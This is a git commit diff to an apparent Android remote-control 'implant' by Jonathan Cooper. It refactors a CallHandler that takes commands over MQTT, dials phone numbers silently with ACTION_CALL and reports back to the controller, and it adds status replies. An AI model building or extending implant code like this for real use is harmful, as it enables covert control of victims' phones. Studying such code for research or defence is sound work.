ffcb824c88ca5d7152b57c1537442b472d01ed55
Jonathan Cooper <cooper@cooperthecoder.com>
2017-07-24 21:41:57 -0500

    Modifications

--- app/src/main/java/com/cooperthecoder/implant/command/handlers/CallHandler.kt
+++ app/src/main/java/com/cooperthecoder/implant/command/handlers/CallHandler.kt
@@ -1,4 +1,4 @@
-package com.cooperthecoder.implant.command
+package com.cooperthecoder.implant.command.handlers
 
 import android.Manifest
 import android.content.Context
@@ -6,7 +6,7 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.support.v4.content.ContextCompat
-import com.cooperthecoder.implant.command.handlers.CommandHandler
+import com.cooperthecoder.implant.command.Command
 import org.eclipse.paho.android.service.MqttAndroidClient
 
 
@@ -22,13 +22,16 @@ class CallHandler(context: Context, client: MqttAndroidClient, command: Command)
         }
 
         if (! phoneNumber.startsWith(PREFIX)) {
-            phoneNumber = "$PREFIX$phoneNumber"
+            phoneNumber = "${PREFIX}$phoneNumber"
         }
 
         val intent = Intent(Intent.ACTION_CALL)
         intent.setData(Uri.parse(phoneNumber))
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+            reply("Dialing $phoneNumber", "")
             context.startActivity(intent)
+        } else {
+            reply("", "Phone permission has not been granted. Try using the dagger")
         }
     }
 
